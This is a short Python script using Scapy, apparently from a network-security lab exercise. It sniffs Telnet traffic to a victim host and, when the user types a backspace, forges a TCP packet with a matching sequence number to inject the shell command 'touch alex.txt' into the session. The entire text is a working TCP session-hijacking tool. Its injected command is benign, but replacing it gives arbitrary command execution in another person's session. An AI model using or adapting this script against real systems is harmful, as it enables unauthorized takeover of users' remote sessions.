from scapy.all import *

VICTIM_IP = "10.0.2.10"
OBSERVER_IP = "10.0.2.12"


def reply_with_spoofed_packet(packet_ethernet):
    packet_ethernet.show()

    if (type(packet_ethernet[TCP].payload) == scapy.packet.Raw):

        # check that the observer typed a backspace
        # construct new packet based on the backspace
        # easier to calculate seq_num and ack_num
        if (packet_ethernet[TCP].load == b'\x7f'):

            data = "touch alex.txt\n"

            spoofed_packet = IP(
                src=packet_ethernet[IP].src,
                dst=packet_ethernet[IP].dst,
                ttl=packet_ethernet[IP].ttl,
            ) / TCP(
                sport=packet_ethernet[TCP].sport,
                dport=packet_ethernet[TCP].dport,
                flags="PA",
                seq=packet_ethernet[TCP].seq + 1,
                ack=packet_ethernet[TCP].ack,
                window=packet_ethernet[TCP].window,
            ) / data

            spoofed_packet.show()
            send(spoofed_packet)


pkt = sniff(
    filter='tcp port 23 and dst host {VICTIM_IP}'.format(VICTIM_IP=VICTIM_IP),
    prn=reply_with_spoofed_packet)
